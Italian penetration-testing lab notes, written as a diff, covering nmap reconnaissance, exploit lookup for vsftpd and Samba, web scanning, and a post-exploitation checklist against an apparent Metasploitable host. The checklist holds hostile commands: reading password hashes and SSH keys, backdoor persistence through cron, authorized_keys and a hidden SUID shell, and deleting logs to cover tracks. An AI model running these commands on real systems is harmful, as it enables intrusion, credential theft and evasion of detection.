@@ -1,0 +1,114 @@
+Cosa faresti in uno scenario reale
+1. Mappare TUTTI gli host vivi — non solo uno
+2. Identificare il ruolo di ogni host — web server? DB? domain controller? stampante? firewall?
+3. Fingerprinting del MAC — il prefisso OUI (52:54:00) ti dice il vendor della NIC, che può rivelare il tipo di dispositivo
+4. Reverse DNS — nslookup o dig -x su ogni IP per capire i nomi host (spesso rivelano il ruolo: dc01, web-prod, db-master)
+5. Classificare per priorità — quali host attaccare prima? Di solito: domain controller > server critici > workstation > dispositivi IoT
+Comandi aggiuntivi in uno scenario reale
+# Reverse DNS su tutti gli host trovati
+for ip in 192.168.56.1 192.168.56.143; do dig -x $ip +short; done
+
+o
+nmap -O --osscan-guess 192.168.56.0/24
+
+# Fingerprinting OS rapido su tutti
+nmap -O --osscan-guess 192.168.56.0/24
+
+# Identificare servizi comuni su tutti gli host (scansione veloce)
+nmap -sV --top-ports 100 192.168.56.0/24
+
+nmap -sC -sV -O -p- -oA metasploitable_full 192.168.56.143
+
+
+Nmap ti dice COSA c'è → tu cerchi le CVE → trovi l'exploit → lo lanci.
+
+searchsploit vsftpd
+
+
+
+ # Cerca per nome servizio
+searchsploit samba username map
+
+# Vedi i dettagli dell'exploit (testo)
+searchsploit -x unix/remote/16320.rb ----->CVE-2007-2447
+
+#info sul cve
+https://nvd.nist.gov/vuln/detail/CVE-2007-2447
+
+#info su exploit
+https://www.exploit-db.com/exploits/16320
+
+
+
+###web
+# Fingerprinting tecnologie
+whatweb http://192.168.56.143
+
+# Directory brute-force
+gobuster dir -u http://192.168.56.143 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt -q
+
+# Nikto - vulnerabilità web
+nikto -h http://192.168.56.143
+
+
+
+Obiettivi della Post-Exploitation
+1. Capire dove sei
+whoami          # Chi sono?
+id              # Quali gruppi?
+hostname        # Su che macchina?
+uname -a        # Kernel, architettura
+pwd             # Dove sono?
+2. Mappare il sistema
+cat /etc/passwd     # Tutti gli utenti
+cat /etc/shadow     # Hash password (se root)
+ps aux              # Processi attivi
+netstat -tlnp       # Servizi in ascolto
+df -h               # Dischi e spazio
+3. Cercare dati sensibili
+# File con credenziali
+find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
+find / -name "id_rsa" 2>/dev/null
+find / -name ".htpasswd" 2>/dev/null
+
+# Database
+ls /var/lib/mysql/
+ls /var/lib/postgresql/
+
+# Email
+ls /var/mail/
+4. Privilege Escalation (se non sei già root)
+# Binari SUID
+find / -perm -4000 -type f 2>/dev/null
+
+# Sudo
+sudo -l
+
+# Kernel exploit
+uname -r  # cerchi CVE per quel kernel
+5. Persistenza
+# Cron job
+echo "* * * * * /tmp/backdoor.sh" | crontab -
+
+# SSH key
+mkdir -p /root/.ssh
+echo "chiave_pubblica" >> /root/.ssh/authorized_keys
+
+# SUID binary
+cp /bin/bash /tmp/.hidden
+chmod 4755 /tmp/.hidden
+6. Lateral Movement
+# Credenziali trovate → provare su altri host
+ssh user@192.168.56.x
+
+# Hash password → crackare con hashcat
+# Pass-the-hash su Windows
+7. Pulizia tracce
+# Cancellare log
+rm /var/log/auth.log
+history -c
+
+# Rimuovere file lasciati
+rm /tmp/backdoor.sh
+
+
